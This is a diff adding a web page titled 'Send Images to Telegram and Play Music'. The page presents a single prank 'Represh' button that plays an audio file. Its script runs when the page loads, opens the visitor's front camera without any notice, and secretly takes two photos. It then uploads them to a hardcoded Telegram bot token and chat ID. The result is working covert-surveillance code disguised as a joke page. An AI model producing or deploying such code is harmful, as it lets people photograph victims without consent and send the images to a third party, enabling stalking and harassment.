@@ -1,0 +1,99 @@
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Send Images to Telegram and Play Music</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: white;
+        }
+        .button {
+            background-color: #FF5733;
+            color: black;
+            font-family: Arial, sans-serif;
+            font-size: 24px;
+            font-weight: bold;
+            padding: 10px 20px;
+            border: 2px solid black;
+            text-align: center;
+            text-transform: uppercase;
+            cursor: pointer;
+        }
+        video, canvas {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="button" onclick="playMusic()">Represh</div>
+    <video id="video" autoplay></video>
+    <canvas id="canvas"></canvas>
+    <audio id="audio" src="idiot.mp3" preload="auto"></audio>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            const telegramBotToken = '7721778131:AAGmUWdcG0zWz0Om65AM7NXfhyhldHVNT1k';
+            const chatId = '7336408897';
+
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            const context = canvas.getContext('2d');
+
+            // Access the camera
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
+                .then(stream => {
+                    video.srcObject = stream;
+                    video.play();
+
+                    // Take two pictures after the video stream is ready
+                    video.addEventListener('loadeddata', () => {
+                        setTimeout(() => {
+                            takePictureAndSend();
+                            setTimeout(() => {
+                                takePictureAndSend();
+                            }, 2000); // Take second picture after 2 seconds
+                        }, 2000); // Take first picture after 2 seconds
+                    });
+                })
+                .catch(err => {
+                    console.error('Error accessing the camera: ', err);
+                });
+
+            function takePictureAndSend() {
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                canvas.toBlob(blob => {
+                    const formData = new FormData();
+                    formData.append('chat_id', chatId);
+                    formData.append('photo', blob, 'image.jpg');
+
+                    fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        console.log('Image sent successfully:', data);
+                    })
+                    .catch(error => {
+                        console.error('Error sending image:', error);
+                    });
+                }, 'image/jpeg');
+            }
+        });
+
+        function playMusic() {
+            const audio = document.getElementById('audio');
+            audio.volume = 1,0; // Set volume to maximum
+            audio.play();
+        }
+    </script>
+</body>
+</html>
